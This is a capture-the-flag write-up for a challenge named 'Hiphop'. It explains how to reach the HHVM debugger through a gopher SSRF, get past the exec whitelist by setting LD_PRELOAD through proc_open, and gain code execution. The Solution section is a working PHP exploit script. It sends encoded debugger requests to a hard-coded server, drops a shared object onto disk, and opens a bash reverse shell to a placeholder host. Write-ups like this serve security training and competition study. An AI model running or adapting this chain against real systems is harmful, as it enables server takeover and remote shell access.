# Hiphop

## Writeup

1. Read `file:///proc/self/cmdline` to get Hiphop command line, found `-dhhvm.debugger.vs_debug_enable=1`.
2. Install Visual Studio Code & HHVM and start debugging.
3. Now you can execute any Hacklang in debug console, try hard to bypass `-dhhvm.server.whitelist_exec=true`.
4. Capture the traffic and convert TCP stream to gopher URL.

## Tips

1. When you debug gopher URL, you may find neither PHP 8 nor curl you installed locally can send gopher requests to HHVM server. That's because some versions of curl/libcurl cannot handle gopher URL with '%00'.
2. Hacklang's `putenv` never call syscall `putenv`, it just put the env into its `g_context`, as is you cannot call `mail()`/`imap_mail()` with `LD_PRELOAD`. I checked almost all functions that will call `execve` and only `proc_open` allows me to set environment variables.
3. Calling `system` or `proc_open` will run `sh -c "YOUR_COMMAND"`, even if command == `""`. So no matter what, `getuid` in `LD_PRELOAD` will always be called.
4. Some syntax of Hacklang cannot be used in debugging context so just `eval()` it.
5. Hacklang is very strange from PHP, its doc is bullshit. What's even more annoys me is that even StackOverflow doesn't have a discussion about it. Good luck to you hackers.

## Solution
```php
<?php

function req ($a) {
  $ch = curl_init();
  curl_setopt($ch, CURLOPT_URL, 'http://124.71.132.232:58080/?url=' . urlencode('gopher://127.0.0.1:8999/_' . urlencode($a)));
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_HEADER, 0);
  $output = curl_exec($ch);
  var_dump(curl_error($ch));
  curl_close($ch);
}

$sandbox = '/var/www/html/sandbox/1b5337d0c8ad813197b506146d8d503d/a.so';
$command = 'bash -i >& /dev/tcp/YOURIP/YOURPORT 0>&1';
$ldpreload = './ldpreload/a.so';

req('{"command":"attach","arguments":{"name":"Attach","type":"hhvm","request":"attach","host":"localhost","port":8999,"remoteSiteRoot":"/","localWorkspaceRoot":"/","__configurationTarget":5,"__sessionId":"","sandboxUser":"root"},"type":"request","seq":1}' . "\0" . '{"command":"evaluate","arguments":{"expression":"file_put_contents(\'' . $sandbox . '\',base64_decode(\'' . base64_encode(file_get_contents($ldpreload)) . '\'));eval(base64_decode(\'' . base64_encode('function aa(){$ch=1;proc_open(\'\',dict[],inout $ch,\'\',dict[\'LD_PRELOAD\'=>\'' . $sandbox . '\',\'COMMAND\'=>\'bash -c \\\'' . $command . '\\\'\']);}') . '\'));aa();","context":"repl"},"type":"request","seq":2}' . "\0");
```

## Unintended solution

No one bypassed `hhvm.server.whitelist_exec=true` in my one. All solved teams (7 teams) used an unintended function that did not check the whitelist to bypass it, it's better to check theirs writeup. I will update it here soon.